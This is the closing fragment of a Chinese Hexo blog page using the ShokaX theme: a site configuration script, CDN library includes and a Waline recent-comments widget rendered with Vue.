class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
        path: `2025/05/19/web/web知识/`,
        favicon: {
        show: `不负韶华`,
        hide: `以梦为马！`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,
    chart: false,
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://polyfill.io/v3/polyfill.min.js?features=default,fetch"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.0.2/pace.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/algoliasearch/4.12.1/algoliasearch-lite.umd.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/instantsearch.js/4.39.0/instantsearch.production.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/quicklink/2.2.0/quicklink.umd.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/??jquery/3.5.1/jquery.min.js,fancybox/3.5.7/jquery.fancybox.min.js,justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" async></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/KaTeX/0.15.2/contrib/copy-tex.min.js" async></script><script src="/js/app.js?v=0.3.5"></script>
    <script type="module" data-pjax>
        let items = []
        import { RecentComments } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs'
        RecentComments({
          serverURL: 'https://vvwwvv.zeabur.app',
          count: 10,
        }).then(({ comments }) => {
          comments.forEach(function (item) {
              let cText = (item.orig.length > 50) ? item.orig.substring(0,50)+'...' : item.orig
              item.url = item.url !== '/' ?  '/' + item.url : item.url;
              const siteLink = item.url + "#" + item.objectId
              items.push({
                  href: siteLink,
                  nick: item.nick,
                  time: item.insertedAt.split('T').shift(),
                  text: cText
              })
          })
          Vue.createApp({
            data() {
                return {
                    coms: items,
                    root: ''
                }
            }
          }).mount('#new-comment')
        }).catch(function (err) {
          console.error(err)
        })
    </script>
    </body></html>